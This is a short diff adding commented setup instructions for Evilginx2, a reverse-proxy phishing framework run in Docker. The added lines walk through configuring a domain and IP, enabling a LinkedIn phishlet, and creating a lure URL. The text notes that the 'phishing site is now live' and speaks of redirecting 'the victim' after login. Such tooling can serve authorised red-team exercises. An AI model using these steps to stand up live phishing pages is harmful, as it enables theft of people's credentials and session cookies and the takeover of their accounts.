@@ -33,3 +33,24 @@ systemctl restart systemd-resolved
 # sudo su
 # Run EvilGinx2 in developer mode (generates self-signed certificates for all hostnames)
 # docker run -it -p 53:53/udp -p 80:80 -p 443:443 --name evilginx2 -v /opt/evilginx2/phishlets:/app/phishlets evilginx2 -developer
+
+# *********** Getting Started ***********
+# Reference:
+# https://github.com/kgretzky/evilginx2#getting-started
+# https://breakdev.org/evilginx-2-1-the-first-post-release-update/
+
+# Set up your server's domain and IP using following commands
+# config domain yourdomain.com
+# config ip 10.0.0.1
+
+# Now you can set up the phishlet you want to use.
+# phishlets hostname linkedin my.phishing.hostname.yourdomain.com
+# phishlets get-hosts linkedin
+
+# And now you can enable the phishlet
+# phishlets enable linkedin
+
+# Your phishing site is now live. Think of the URL, you want the victim to be redirected to on successful login
+# lures create linkedin
+# lures edit 0 redirect_url https://www.google.com
+# lures get-url 0
